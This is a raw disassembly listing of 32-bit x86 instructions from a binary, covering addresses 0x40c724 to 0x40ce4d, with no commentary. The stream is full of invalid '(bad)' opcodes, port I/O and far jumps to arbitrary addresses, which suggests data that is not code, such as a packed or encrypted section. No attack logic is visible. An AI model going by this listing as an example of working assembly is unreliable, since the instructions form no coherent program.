  40c724:	fdivrp st(2),st
  40c726:	xor    dh,bh
  40c728:	loop   0x40c782
  40c72a:	fcomp  QWORD PTR [ebx-0x3a]
  40c72d:	sbb    ecx,DWORD PTR [esi+0x4c]
  40c730:	gs jmp 0x40c6dd
  40c733:	popf   
  40c734:	shl    BYTE PTR [eax-0x3e],1
  40c737:	out    0xca,eax
  40c739:	sub    bh,BYTE PTR [edi-0x56]
  40c73c:	cmp    edi,edi
  40c73e:	mov    al,ds:0x3ce19986
  40c743:	cdq    
  40c744:	mov    cl,0x44
  40c746:	inc    ebx
  40c747:	and    BYTE PTR [edi],0xa7
  40c74a:	cld    
  40c74b:	jnp    0x40c6ce
  40c74d:	pusha  
  40c74e:	add    ebp,0x817a625a
  40c754:	data16 jp 0x40c764
  40c757:	test   al,0xd8
  40c759:	xchg   esi,eax
  40c75a:	xchg   esp,eax
  40c75b:	inc    ebx
  40c75c:	(bad)  
  40c75d:	fs push edx
  40c75f:	xor    ebp,DWORD PTR [ebp-0x3cc37887]
  40c765:	jp     0x40c7a8
  40c767:	mov    ah,0xad
  40c769:	stos   BYTE PTR es:[edi],al
  40c76a:	jno    0x40c7ce
  40c76c:	fistp  WORD PTR [eax+0x31]
  40c76f:	aad    0x3e
  40c771:	(bad)  
  40c772:	fdivr  DWORD PTR [edi-0x7594fef8]
  40c778:	xchg   edx,eax
  40c779:	mov    al,ds:0x4c835dec
  40c77e:	xchg   ecx,eax
  40c77f:	mov    bh,0xf8
  40c781:	mov    bl,BYTE PTR [esi-0x68]
  40c784:	out    0x6,eax
  40c786:	pop    es
  40c787:	stc    
  40c788:	sub    al,0x33
  40c78a:	inc    ebp
  40c78b:	addr16 pop ds
  40c78d:	rcl    DWORD PTR [edx-0x34],1
  40c790:	imul   eax
  40c792:	jmp    0xfd70bcf8
  40c797:	fsubrp st(6),st
  40c799:	outs   dx,DWORD PTR ds:[esi]
  40c79a:	mov    cl,0xd1
  40c79c:	push   0xffffffe0
  40c79e:	dec    ebp
  40c79f:	add    eax,0x6adbadc0
  40c7a4:	ds je  0x40c7f0
  40c7a7:	inc    edi
  40c7a8:	ret    0x1932
  40c7ab:	and    esi,edx
  40c7ad:	jl     0x40c79c
  40c7af:	dec    edi
  40c7b0:	ja     0x40c778
  40c7b2:	mov    DWORD PTR [eax+0xf51ac6],edx
  40c7b8:	mov    dl,0xd7
  40c7ba:	xchg   ebx,eax
  40c7bb:	push   edi
  40c7bc:	fdivp  st(7),st
  40c7be:	test   eax,0x4b8c3478
  40c7c3:	mov    eax,0xaa43b410
  40c7c8:	enter  0x195d,0x62
  40c7cc:	pop    ebp
  40c7cd:	loopne 0x40c822
  40c7cf:	leave  
  40c7d0:	lods   eax,DWORD PTR ds:[esi]
  40c7d1:	push   esp
  40c7d2:	or     dl,BYTE PTR [eax]
  40c7d4:	loopne 0x40c766
  40c7d6:	xor    al,0x58
  40c7d8:	xor    esp,DWORD PTR [edi+edi*8+0x41]
  40c7dc:	int3   
  40c7dd:	(bad)  
  40c7de:	jmp    0xf39abd8b
  40c7e3:	xor    ebx,esp
  40c7e5:	std    
  40c7e6:	lods   eax,DWORD PTR ds:[esi]
  40c7e7:	add    eax,0xeb9e9162
  40c7ec:	jmp    0xa9ad:0x7c06eb62
  40c7f3:	xor    esi,DWORD PTR [edx-0x63]
  40c7f6:	xchg   DWORD PTR [ecx],eax
  40c7f8:	stos   DWORD PTR es:[edi],eax
  40c7f9:	push   eax
  40c7fa:	pop    ds
  40c7fb:	std    
  40c7fc:	mov    bh,0xcb
  40c7fe:	jecxz  0x40c79c
  40c800:	mov    ds:0x437e0f82,al
  40c805:	xchg   edi,eax
  40c806:	out    0xb3,eax
  40c808:	pop    esi
  40c809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c80a:	pop    esi
  40c80b:	cs push esp
  40c80d:	int3   
  40c80e:	xlat   BYTE PTR ds:[ebx]
  40c80f:	pushf  
  40c810:	bound  ecx,QWORD PTR [ecx]
  40c812:	push   0xfffffff4
  40c814:	xchg   edx,eax
  40c815:	fild   DWORD PTR ds:0x6b2e8ee9
  40c81b:	push   ecx
  40c81c:	shl    DWORD PTR [ecx],0x44
  40c81f:	fild   DWORD PTR [edx]
  40c821:	xor    ebx,DWORD PTR [eax]
  40c823:	push   ss
  40c824:	daa    
  40c825:	test   BYTE PTR ds:0xda34f275,dl
  40c82b:	enterw 0xca7e,0x8f
  40c830:	xlat   BYTE PTR ds:[ebx]
  40c831:	in     al,dx
  40c832:	cmc    
  40c833:	adc    ecx,DWORD PTR [esi+0x2f81c81d]
  40c839:	(bad)  
  40c83a:	jmp    0xe64f2adc
  40c83f:	test   al,0x2a
  40c841:	inc    edi
  40c842:	repnz or ch,BYTE PTR [esi]
  40c845:	test   eax,0xedb65d3d
  40c84a:	xor    ah,BYTE PTR [edi-0x64]
  40c84d:	cmovno edx,DWORD PTR ds:0xe3254cf
  40c854:	daa    
  40c855:	int3   
  40c856:	pop    es
  40c857:	push   0xbe4a867d
  40c85c:	inc    edx
  40c85d:	add    dh,bl
  40c85f:	test   BYTE PTR [edx+ebx*2+0x5c36ff32],al
  40c866:	cmp    BYTE PTR ds:0x22c0a3d0,ah
  40c86c:	cld    
  40c86d:	stos   DWORD PTR es:[edi],eax
  40c86e:	bound  esp,QWORD PTR [edi]
  40c870:	mov    dl,0xb0
  40c872:	add    eax,eax
  40c874:	cwde   
  40c875:	clc    
  40c876:	icebp  
  40c877:	mov    dh,0x2
  40c879:	lods   al,BYTE PTR ds:[esi]
  40c87a:	call   0xbe76:0x8110722a
  40c881:	ds push esp
  40c883:	mov    ecx,0xb7fcee7e
  40c888:	ds rol bp,0x90
  40c88d:	in     eax,dx
  40c88e:	call   0xcc3d8fb4
  40c893:	and    eax,0x74c66364
  40c898:	into   
  40c899:	adc    ecx,ecx
  40c89b:	(bad)  
  40c89c:	push   cs
  40c89d:	dec    esp
  40c89e:	and    DWORD PTR ds:0x22f3d76f,ebx
  40c8a4:	inc    edx
  40c8a5:	inc    ebx
  40c8a6:	inc    edi
  40c8a7:	scas   eax,DWORD PTR es:[edi]
  40c8a8:	bound  esp,QWORD PTR [ebx+0x38a2b272]
  40c8ae:	push   cs
  40c8af:	add    BYTE PTR [edx-0x36],bh
  40c8b2:	pop    ebx
  40c8b3:	pop    esp
  40c8b4:	popa   
  40c8b5:	out    0x90,al
  40c8b7:	les    eax,FWORD PTR [edi]
  40c8b9:	clc    
  40c8ba:	dec    ebp
  40c8bb:	hlt    
  40c8bc:	mov    esi,0x3f9c1cb7
  40c8c1:	mov    bl,0x7e
  40c8c3:	ss mov esp,esi
  40c8c6:	jb     0x40c87f
  40c8c8:	loop   0x40c888
  40c8ca:	outs   dx,DWORD PTR ds:[esi]
  40c8cb:	push   edx
  40c8cd:	mov    al,ds:0xd8c6e812
  40c8d2:	retf   0x3944
  40c8d5:	adc    al,0x62
  40c8d7:	mov    esp,0xfd6812fc
  40c8dc:	pop    edx
  40c8dd:	test   bl,dh
  40c8df:	pusha  
  40c8e0:	scas   al,BYTE PTR es:[edi]
  40c8e1:	inc    esp
  40c8e2:	fucom  st(1)
  40c8e4:	mov    edi,0xd2b7a313
  40c8e9:	js     0x40c95d
  40c8eb:	rcl    dh,0xf
  40c8ee:	lds    edi,FWORD PTR [edx-0x53]
  40c8f1:	or     ebx,DWORD PTR [eax+0x56]
  40c8f4:	or     bl,dh
  40c8f6:	stos   BYTE PTR es:[edi],al
  40c8f7:	arpl   WORD PTR [edi+0x156fe09f],bp
  40c8fd:	jns    0x40c8e7
  40c8ff:	mov    esi,0x6171dc93
  40c904:	test   eax,0xd8239958
  40c909:	adc    al,0x43
  40c90b:	mov    ecx,0x51f0bb07
  40c911:	or     bl,BYTE PTR [edx]
  40c913:	xchg   DWORD PTR [edi+0x62],esp
  40c916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c917:	xchg   ebp,eax
  40c918:	mov    ebp,0x4cd7dcc
  40c91d:	shl    DWORD PTR [ecx+0x51],0x35
  40c921:	xor    DWORD PTR [edx+0x333b8c97],ecx
  40c927:	iret   
  40c928:	sub    eax,0x54893e68
  40c92d:	dec    esp
  40c92e:	popf   
  40c92f:	push   0x9e7160f9
  40c934:	and    DWORD PTR [ecx],ecx
  40c936:	sbb    eax,0xcaa814e2
  40c93b:	imul   ebx,edx,0xf44e6916
  40c941:	inc    ebx
  40c942:	loopne 0x40c900
  40c944:	xor    eax,0xd6c6b9c9
  40c949:	aaa    
  40c94a:	mov    ebx,0xb59452d
  40c94f:	lea    edx,[ecx-0x4f]
  40c952:	fbstp  TBYTE PTR [ebp+0x40]
  40c955:	cmp    BYTE PTR [ecx-0x52313861],ch
  40c95b:	aam    0x5c
  40c95d:	cmp    BYTE PTR ds:0x959e3508,ch
  40c963:	xor    BYTE PTR [ebp+0x153ed329],0xa7
  40c96a:	pop    esp
  40c96b:	xor    DWORD PTR [edx],eax
  40c96d:	adc    al,BYTE PTR [ecx]
  40c96f:	sub    BYTE PTR [esi+0x19],ah
  40c972:	xchg   esi,eax
  40c973:	sbb    esp,esp
  40c975:	add    DWORD PTR [esp+ebx*8],ebp
  40c978:	sbb    DWORD PTR [ebx],0xfaabaad3
  40c97e:	xor    ah,bl
  40c980:	xor    bl,0x74
  40c983:	nop
  40c984:	stos   DWORD PTR es:[edi],eax
  40c985:	mov    esp,0xa1de1bc2
  40c98a:	mov    dh,0x90
  40c98c:	cmp    ah,0xcc
  40c98f:	ss xor al,0xa
  40c992:	popa   
  40c993:	xchg   cl,dl
  40c995:	xchg   BYTE PTR [ebx],ch
  40c997:	arpl   si,si
  40c999:	mov    dl,0xe2
  40c99b:	sbb    dl,BYTE PTR [eax+edi*8+0x3a]
  40c99f:	jge    0x40c9f5
  40c9a1:	cdq    
  40c9a2:	ror    DWORD PTR [esp+eax*1+0x47d11823],1
  40c9a9:	ret    
  40c9aa:	xor    eax,0xe8f28486
  40c9af:	push   edx
  40c9b0:	dec    esi
  40c9b1:	jmp    0x8baf77c4
  40c9b6:	scas   eax,DWORD PTR es:[edi]
  40c9b7:	push   edi
  40c9b8:	ja     0x40c9f8
  40c9ba:	std    
  40c9bb:	in     eax,0xe6
  40c9bd:	in     eax,0xae
  40c9bf:	fisubr WORD PTR [edx-0x6848a39d]
  40c9c5:	loop   0x40c9b5
  40c9c7:	fs ret 0xc5db
  40c9cb:	add    ecx,edi
  40c9cd:	mov    edi,0xa07ecfc9
  40c9d2:	pop    ss
  40c9d3:	add    esp,ecx
  40c9d5:	paddsw mm7,QWORD PTR [esi+0x5c3cd8c]
  40c9dc:	sbb    esi,DWORD PTR [esi-0x521f1598]
  40c9e2:	jle    0x40ca51
  40c9e4:	test   al,0xa8
  40c9e6:	enter  0xd1bc,0x54
  40c9ea:	push   ebp
  40c9eb:	call   FWORD PTR [esi-0x15]
  40c9ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ef:	in     eax,dx
  40c9f0:	repz shr DWORD PTR [ecx+esi*1+0x58],1
  40c9f5:	add    dh,BYTE PTR [edi+ebx*4]
  40c9f8:	fnstsw WORD PTR [edi-0x21]
  40c9fb:	cmp    al,0xc3
  40c9fd:	inc    ecx
  40c9fe:	adc    BYTE PTR [esi+ebx*1],al
  40ca01:	or     eax,0xe13fe490
  40ca06:	dec    esp
  40ca07:	adc    DWORD PTR [ebx],0x13bba9c
  40ca0d:	pop    ss
  40ca0e:	int3   
  40ca0f:	mov    ah,0xd6
  40ca11:	mov    WORD PTR [esi-0x1e],fs
  40ca14:	stos   BYTE PTR es:[edi],al
  40ca15:	lea    ecx,[ecx-0x2a]
  40ca18:	out    0xfd,al
  40ca1a:	bound  ecx,QWORD PTR [edx+0x3e6cf094]
  40ca20:	mov    WORD PTR [edx+0x57],es
  40ca23:	sti    
  40ca24:	mov    esi,0x8042c0cc
  40ca29:	jle    0x40ca32
  40ca2b:	int    0x25
  40ca2d:	xchg   esp,eax
  40ca2e:	retf   0xaff2
  40ca31:	jmp    0x63d1:0xd56039f0
  40ca38:	popa   
  40ca39:	or     al,0x38
  40ca3b:	cmp    al,BYTE PTR ds:0x4c8089cc
  40ca41:	inc    edi
  40ca42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca43:	add    BYTE PTR [edi],dl
  40ca45:	mov    edi,0x5fe1a9e7
  40ca4a:	jg     0x40ca92
  40ca4c:	jno    0x40c9d4
  40ca4e:	lea    ebp,[ebx]
  40ca50:	mov    ch,BYTE PTR [edx+0x11ef3a74]
  40ca56:	mov    ebp,0x54bf40b5
  40ca5b:	push   edx
  40ca5c:	add    edx,ebp
  40ca5e:	xchg   ebx,eax
  40ca5f:	jne    0x40cac7
  40ca61:	das    
  40ca62:	jl     0x40caa5
  40ca64:	shr    BYTE PTR [edi-0x44629742],1
  40ca6a:	out    0x1e,eax
  40ca6c:	retf   0xb96d
  40ca6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca70:	pop    ebp
  40ca71:	inc    edi
  40ca72:	repnz (bad) 
  40ca74:	aaa    
  40ca75:	lods   eax,DWORD PTR ds:[esi]
  40ca76:	inc    BYTE PTR [edx]
  40ca78:	test   al,0x5
  40ca7a:	mov    dl,0x5e
  40ca7c:	bnd jmp 0x780c9e55
  40ca82:	(bad)  
  40ca83:	test   al,0xf3
  40ca85:	and    al,0xdf
  40ca87:	xor    BYTE PTR [ecx+eax*8],bh
  40ca8a:	ret    0xeec5
  40ca8d:	js     0x40ca3f
  40ca8f:	in     al,dx
  40ca90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca91:	out    dx,al
  40ca92:	and    dh,ah
  40ca94:	adc    DWORD PTR [edx],0xffffff85
  40ca97:	test   cl,0x8e
  40ca9a:	aam    0xff
  40ca9c:	loopne 0x40ca53
  40ca9e:	call   0xb7f670b1
  40caa3:	je     0x40ca38
  40caa5:	mov    ecx,0xfffa5b24
  40caaa:	mov    WORD PTR [ebx+0x1d74f5ab],?
  40cab0:	xchg   edx,eax
  40cab1:	in     al,0xfb
  40cab3:	js     0x40cb34
  40cab5:	iret   
  40cab6:	sti    
  40cab7:	fwait
  40cab8:	jnp    0x40cb2f
  40caba:	jp     0x40cb03
  40cabc:	in     al,dx
  40cabd:	aam    0xbf
  40cabf:	or     ebx,DWORD PTR [esi]
  40cac1:	out    dx,eax
  40cac2:	and    BYTE PTR [ecx],0xd7
  40cac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cac6:	mov    WORD PTR [edx],fs
  40cac8:	or     BYTE PTR [ebp-0x1c364b24],ah
  40cace:	inc    esi
  40cacf:	cmp    al,0x9b
  40cad1:	test   al,0xc2
  40cad3:	xchg   esp,eax
  40cad4:	fwait
  40cad5:	jns    0x40ca7d
  40cad7:	inc    ebx
  40cad8:	xchg   ebp,eax
  40cad9:	daa    
  40cada:	pop    edx
  40cadb:	lock jecxz 0x40cadc
  40cade:	cld    
  40cadf:	jle    0x40cb28
  40cae1:	jecxz  0x40cb16
  40cae3:	mov    ebp,0xbb658ba2
  40cae8:	call   0x86ad:0x9e2fe099
  40caef:	xor    BYTE PTR [edx+0x52c01fb5],cl
  40caf5:	and    BYTE PTR [ebp+0x3d5bcfa1],0xbb
  40cafc:	push   cs
  40cafd:	sbb    ecx,ebx
  40caff:	sub    eax,0x22f30781
  40cb04:	lods   eax,DWORD PTR ds:[esi]
  40cb05:	shl    DWORD PTR [esi+ecx*1],0xce
  40cb09:	fldcw  WORD PTR [ebp+0x64569cc6]
  40cb0f:	imul   esp,DWORD PTR [ebx-0x4e],0x62
  40cb13:	jae    0x40cb72
  40cb15:	jnp    0x40caac
  40cb17:	out    dx,al
  40cb18:	inc    edi
  40cb19:	dec    esi
  40cb1a:	inc    ebp
  40cb1b:	(bad)  
  40cb1c:	push   esp
  40cb1d:	mov    bh,0xf6
  40cb1f:	jmp    0x39d1:0xe6763fe4
  40cb26:	xchg   ebp,eax
  40cb27:	stos   BYTE PTR es:[edi],al
  40cb28:	rol    BYTE PTR [ecx-0x428dc628],1
  40cb2e:	mov    ch,0x32
  40cb30:	xchg   edi,eax
  40cb31:	jae    0x40cb71
  40cb33:	pop    ebx
  40cb34:	repz sub esp,DWORD PTR [eax-0x59]
  40cb38:	jno    0x40cb25
  40cb3a:	mov    esp,0x6e40a6e1
  40cb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb40:	iret   
  40cb41:	dec    esi
  40cb42:	adc    al,0xe6
  40cb44:	sahf   
  40cb45:	jns    0x40caf2
  40cb47:	outs   dx,DWORD PTR ds:[esi]
  40cb48:	sbb    ch,dl
  40cb4a:	mov    ebx,0xc7664751
  40cb4f:	mov    edx,0x68a0c8ef
  40cb54:	xor    DWORD PTR [edx],ebp
  40cb56:	and    eax,0x32187aab
  40cb5b:	and    esi,ecx
  40cb5d:	(bad)
  40cb61:	call   0x47659f18
  40cb66:	or     al,0x3c
  40cb68:	retf   0x951d
  40cb6b:	ret    0x9125
  40cb6e:	pop    es
  40cb6f:	cmp    al,0x10
  40cb71:	loopne 0x40cbef
  40cb73:	iret   
  40cb74:	rcl    DWORD PTR [ebx+0x16],0xaa
  40cb78:	inc    edi
  40cb79:	xchg   BYTE PTR [ebx],cl
  40cb7b:	push   ebx
  40cb7c:	inc    esi
  40cb7d:	out    0x67,al
  40cb7f:	push   0x822a7ad5
  40cb84:	fdiv   QWORD PTR [eax]
  40cb86:	rol    BYTE PTR [ecx],cl
  40cb88:	das    
  40cb89:	inc    ebx
  40cb8a:	pop    eax
  40cb8b:	sub    eax,DWORD PTR [eax]
  40cb8d:	jno    0x40cbf1
  40cb8f:	xchg   ecx,eax
  40cb90:	(bad)
  40cb93:	jns    0x40cbbe
  40cb95:	dec    ecx
  40cb96:	imul   edi,DWORD PTR [ebp-0x70]
  40cb9a:	cmc    
  40cb9b:	mov    al,0xb4
  40cb9d:	and    BYTE PTR [eax-0x1ba375e5],dl
  40cba3:	retf   0x2b86
  40cba6:	fcomp  DWORD PTR [ecx+0x34]
  40cba9:	jb     0x40cbb2
  40cbab:	xchg   ebp,eax
  40cbac:	clc    
  40cbad:	dec    ecx
  40cbae:	xor    al,0x1d
  40cbb0:	push   esi
  40cbb1:	push   ebx
  40cbb2:	sahf   
  40cbb3:	inc    edi
  40cbb4:	nop
  40cbb5:	pop    eax
  40cbb6:	test   edx,ecx
  40cbb8:	fstp   QWORD PTR [ebp+0x4ac619cf]
  40cbbe:	out    0xc3,al
  40cbc0:	fld    TBYTE PTR [edi+edi*2]
  40cbc3:	mov    ds:0xe05a0b91,eax
  40cbc8:	std    
  40cbc9:	mov    al,dl
  40cbcb:	(bad)  
  40cbcc:	aas    
  40cbcd:	or     eax,0xadf79950
  40cbd2:	aaa    
  40cbd3:	push   edi
  40cbd4:	xchg   DWORD PTR [edi],esp
  40cbd6:	not    BYTE PTR [edi]
  40cbd8:	mov    cl,BYTE PTR [edx]
  40cbda:	inc    esp
  40cbdb:	out    0xff,al
  40cbdd:	adc    al,0xd1
  40cbdf:	sbb    esp,DWORD PTR [eax-0x448e59d8]
  40cbe5:	cmp    eax,0x13d2fb80
  40cbea:	mov    dl,0x7
  40cbec:	mov    dh,0xfe
  40cbee:	dec    eax
  40cbef:	mov    edi,esi
  40cbf1:	adc    eax,0x456e43ef
  40cbf6:	dec    eax
  40cbf7:	aad    0xc3
  40cbf9:	dec    edx
  40cbfa:	fdiv   DWORD PTR [esi+0x1]
  40cbfd:	fidivr DWORD PTR [eax]
  40cbff:	xchg   esp,eax
  40cc00:	mov    dl,0xf1
  40cc02:	aas    
  40cc03:	repnz daa 
  40cc05:	mov    dl,0xc6
  40cc07:	mov    ch,0x9f
  40cc09:	ins    DWORD PTR es:[edi],dx
  40cc0a:	sbb    dh,BYTE PTR [ebp+0x71]
  40cc0d:	outs   dx,DWORD PTR ds:[esi]
  40cc0e:	fistp  QWORD PTR [ebp-0x40]
  40cc11:	dec    eax
  40cc12:	add    DWORD PTR [edi],ebp
  40cc14:	je     0x40cbc6
  40cc16:	inc    ebp
  40cc17:	mov    ebx,?
  40cc19:	ins    BYTE PTR es:[edi],dx
  40cc1a:	or     ch,BYTE PTR [edx+0x1a]
  40cc1d:	test   al,0xcc
  40cc1f:	add    esp,DWORD PTR [esi+0x100125ca]
  40cc25:	dec    esi
  40cc26:	sar    DWORD PTR [edx],1
  40cc28:	or     dl,dl
  40cc2a:	rol    DWORD PTR [edi-0x7196be71],1
  40cc30:	mov    es,esi
  40cc32:	mov    eax,0x739e41a0
  40cc37:	or     BYTE PTR [esi],ah
  40cc39:	mov    cl,0x3
  40cc3b:	push   es
  40cc3c:	imul   esi,DWORD PTR [esp+edx*4],0x2c
  40cc40:	pop    esp
  40cc41:	fisttp WORD PTR [edi]
  40cc43:	icebp  
  40cc44:	shl    eax,1
  40cc46:	cli    
  40cc47:	push   cs
  40cc48:	mov    ebx,0x1d612786
  40cc4d:	jmp    0x2f7118f5
  40cc52:	lock test al,0xaa
  40cc55:	lahf   
  40cc56:	call   0xb4a71ba8
  40cc5b:	sbb    eax,0x750891fa
  40cc60:	dec    eax
  40cc61:	jmp    0xabb7:0xaf7934b9
  40cc68:	shl    DWORD PTR [ebx],0xcb
  40cc6b:	dec    edi
  40cc6c:	ins    BYTE PTR es:[edi],dx
  40cc6d:	cmp    ebp,DWORD PTR [edx+0x6d]
  40cc70:	inc    ecx
  40cc71:	retf   0xccbd
  40cc74:	dec    eax
  40cc75:	mov    bl,BYTE PTR [eax+0x5d]
  40cc78:	outs   dx,BYTE PTR ds:[esi]
  40cc79:	xchg   esp,eax
  40cc7a:	aaa    
  40cc7b:	fwait
  40cc7c:	pop    edx
  40cc7d:	adc    dl,al
  40cc7f:	stos   DWORD PTR es:[edi],eax
  40cc80:	in     eax,dx
  40cc81:	std    
  40cc82:	stos   BYTE PTR es:[edi],al
  40cc83:	dec    ebp
  40cc84:	popf   
  40cc85:	xor    DWORD PTR [ebp-0x28],ebp
  40cc88:	or     eax,0xf2dc5bb7
  40cc8d:	test   BYTE PTR ds:0xec6bab19,0x4e
  40cc94:	repnz sub eax,0x874aebe7
  40cc9a:	lds    esi,FWORD PTR [ecx]
  40cc9c:	dec    ebp
  40cc9d:	push   DWORD PTR [edx+0x1e6ef09f]
  40cca3:	sti    
  40cca4:	fimul  DWORD PTR [ecx]
  40cca6:	dec    esp
  40cca7:	je     0x40cd28
  40cca9:	je     0x40ccb9
  40ccab:	xchg   edi,eax
  40ccac:	sub    BYTE PTR ds:0x1934bbe5,bh
  40ccb2:	in     eax,0xbb
  40ccb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccb5:	iret   
  40ccb6:	(bad)  
  40ccb7:	jg     0x40cced
  40ccb9:	inc    ebx
  40ccba:	std    
  40ccbb:	mov    bl,ah
  40ccbd:	xchg   ecx,eax
  40ccbe:	xchg   ecx,eax
  40ccbf:	adc    ch,BYTE PTR [ebx]
  40ccc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccc2:	std    
  40ccc3:	retf   
  40ccc4:	scas   eax,DWORD PTR es:[edi]
  40ccc5:	xor    DWORD PTR [ebx],esi
  40ccc7:	pop    ds
  40ccc8:	sbb    edi,ecx
  40ccca:	pop    eax
  40cccb:	dec    ebx
  40cccc:	es push ds
  40ccce:	pop    ebp
  40cccf:	dec    ecx
  40ccd0:	ins    BYTE PTR es:[edi],dx
  40ccd1:	shl    BYTE PTR [ecx],cl
  40ccd3:	mov    esp,0x73fd0bbe
  40ccd8:	pop    edx
  40ccd9:	cld    
  40ccda:	clc    
  40ccdb:	inc    ebp
  40ccdc:	(bad)  
  40ccdd:	mov    bh,0xef
  40ccdf:	dec    ecx
  40cce0:	out    dx,al
  40cce1:	mov    al,ds:0xda8d3e5c
  40cce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cce7:	mov    dh,0x45
  40cce9:	push   ebx
  40ccea:	lea    esi,[edx+0x2a8939e8]
  40ccf0:	outs   dx,BYTE PTR ds:[esi]
  40ccf1:	stos   DWORD PTR es:[edi],eax
  40ccf2:	push   cs
  40ccf3:	(bad)  [ecx]
  40ccf5:	push   edi
  40ccf6:	aad    0x4f
  40ccf8:	paddsw mm2,QWORD PTR [ebp-0x6805b371]
  40ccff:	inc    edi
  40cd00:	repz xor BYTE PTR [esi-0x32ca34fd],0x1
  40cd08:	je     0x40cd06
  40cd0a:	jne    0x40cd39
  40cd0c:	sahf   
  40cd0d:	fidiv  DWORD PTR [ebx+0x4cf25fb2]
  40cd13:	in     al,0x97
  40cd15:	sbb    al,0xa2
  40cd17:	pusha  
  40cd18:	std    
  40cd19:	int    0xf9
  40cd1b:	jmp    0x8925ee7e
  40cd20:	in     eax,0x98
  40cd22:	inc    ebx
  40cd23:	mov    ds:0xe7a15343,eax
  40cd28:	stos   DWORD PTR es:[edi],eax
  40cd29:	xchg   edx,eax
  40cd2a:	outs   dx,BYTE PTR ds:[esi]
  40cd2b:	bound  ecx,QWORD PTR [ebx+0x5e]
  40cd2e:	sar    esi,0x6f
  40cd31:	leave  
  40cd32:	jbe    0xe30f89d4
  40cd38:	gs dec ecx
  40cd3a:	or     BYTE PTR [ecx-0x4143be0f],0xb0
  40cd41:	mov    edx,0xd973cf0b
  40cd46:	fwait
  40cd47:	test   BYTE PTR [ecx-0x3ee57af1],dl
  40cd4d:	cmp    bh,BYTE PTR [edx-0x54d293a8]
  40cd53:	fs dec ebp
  40cd55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd56:	pop    eax
  40cd57:	loopne 0x40cd85
  40cd59:	mul    DWORD PTR [ecx]
  40cd5b:	dec    ebp
  40cd5c:	add    al,0xff
  40cd5e:	std    
  40cd5f:	mov    dh,0xd0
  40cd61:	dec    edx
  40cd62:	mov    ds:0x3115aa1f,eax
  40cd67:	imul   edi,DWORD PTR [ebx-0x201dd59e],0xca40554d
  40cd71:	pop    ebx
  40cd72:	dec    ebx
  40cd73:	das    
  40cd74:	push   esi
  40cd75:	je     0x40cd2e
  40cd77:	pop    ecx
  40cd78:	push   cs
  40cd79:	outs   dx,DWORD PTR ds:[esi]
  40cd7a:	mov    al,0xce
  40cd7c:	pop    edx
  40cd7d:	adc    al,0x30
  40cd7f:	lea    esi,[ebx]
  40cd81:	das    
  40cd82:	into   
  40cd83:	(bad)  
  40cd84:	aas    
  40cd85:	add    DWORD PTR [ecx+0x66],edx
  40cd88:	add    al,0xa6
  40cd8a:	imul   ebp,esi,0xffffff9c
  40cd8d:	inc    ecx
  40cd8e:	sub    al,0x72
  40cd90:	fistp  DWORD PTR [ebp+edx*8-0xf]
  40cd94:	xchg   ecx,eax
  40cd95:	lahf   
  40cd96:	cli    
  40cd97:	dec    edx
  40cd98:	rcl    ch,cl
  40cd9a:	push   DWORD PTR [edi]
  40cd9c:	or     dh,BYTE PTR [ecx-0x1483aab1]
  40cda2:	clc    
  40cda3:	(bad)  
  40cda4:	jmp    0x5806:0x32695aa9
  40cdab:	mov    dh,0x26
  40cdad:	inc    esp
  40cdae:	adc    BYTE PTR [eax-0x53],dh
  40cdb1:	out    dx,al
  40cdb2:	push   ds
  40cdb3:	scas   al,BYTE PTR es:[di]
  40cdb5:	mov    ebx,0xeb7d6aba
  40cdba:	push   0xffffffbd
  40cdbc:	mov    ch,0x58
  40cdbe:	and    ebp,esi
  40cdc0:	jle    0x40ce24
  40cdc2:	popf   
  40cdc3:	js     0x40cd7a
  40cdc5:	(bad)  
  40cdc6:	and    dl,BYTE PTR [ebx-0x64]
  40cdc9:	sar    DWORD PTR [edi-0x55],cl
  40cdcc:	push   0x793ed2ee
  40cdd1:	mov    cl,0xf8
  40cdd3:	add    al,0x85
  40cdd5:	push   edi
  40cdd6:	add    DWORD PTR [ebp-0x68],edx
  40cdd9:	out    dx,eax
  40cdda:	sub    dh,BYTE PTR [ecx+0x1b61f2a2]
  40cde0:	dec    ebp
  40cde1:	ins    BYTE PTR es:[edi],dx
  40cde2:	xor    BYTE PTR [ecx-0x6523a91d],0xf
  40cde9:	(bad)  
  40cdea:	ins    DWORD PTR es:[edi],dx
  40cdeb:	cmp    BYTE PTR [edi+edx*8-0x43dfcdf8],cl
  40cdf2:	arpl   WORD PTR [ebp+0x3928e882],cx
  40cdf8:	int3   
  40cdf9:	(bad)  
  40cdfa:	rcl    DWORD PTR [eax],cl
  40cdfc:	es pop ss
  40cdfe:	(bad)  
  40cdff:	mov    esp,0x461a5a07
  40ce04:	add    edx,esi
  40ce06:	sub    dl,ah
  40ce08:	mov    esi,0xff6a3bbe
  40ce0d:	test   eax,0x35af1511
  40ce12:	xchg   BYTE PTR gs:[ebp-0x41],ah
  40ce16:	cld    
  40ce17:	icebp  
  40ce18:	outs   dx,BYTE PTR ds:[esi]
  40ce19:	xchg   ebx,eax
  40ce1a:	push   ebp
  40ce1b:	push   esi
  40ce1c:	mov    edi,0xfe77de84
  40ce21:	and    BYTE PTR [ebp+0x559ae300],ch
  40ce27:	pop    ecx
  40ce28:	lahf   
  40ce29:	and    al,0xfe
  40ce2b:	mov    ecx,0x9ac7b04e
  40ce30:	jmp    0x40ce3f
  40ce32:	pop    edi
  40ce33:	mov    al,0x50
  40ce35:	xchg   ebx,eax
  40ce36:	ja     0x40ce3c
  40ce38:	add    BYTE PTR [edx+0x62],ch
  40ce3b:	es cmp al,0xae
  40ce3e:	pop    esp
  40ce3f:	pop    esp
  40ce40:	and    al,0xab
  40ce43:	les    edx,FWORD PTR [ecx+0x13fa3fa3]
  40ce49:	enter  0xcdac,0x3f
  40ce4d:	mov    BYTE PTR [esi+0x45],bh
